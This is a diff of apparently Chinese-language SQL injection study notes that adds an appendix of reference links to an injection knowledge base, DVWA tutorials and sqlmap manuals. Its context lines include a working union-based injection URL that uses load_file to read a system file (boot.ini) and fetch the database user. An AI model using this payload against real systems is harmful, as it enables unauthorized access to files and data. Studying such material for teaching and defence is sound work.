@@ -378,3 +378,15 @@ Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPL
 ```
 /instrument.php?ID=13 and 1=2 union select 1,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))
 ```
+
+## 附录
+
++ [The SQL Injection Knowledge Base](http://www.websec.ca/kb/sql_injection)
+
++ [新手指南：DVWA-1.9全级别教程之SQL Injection](http://www.freebuf.com/articles/web/120747.html)
+
++ [新手指南：DVWA-1.9全级别教程之SQL Injection(Blind)](http://www.freebuf.com/articles/web/120985.html)
+
++ [SqlMap用户手册](http://www.91ri.org/6775.html)
+
++ [sqlmap用户手册(续)](http://www.91ri.org/6842.html)
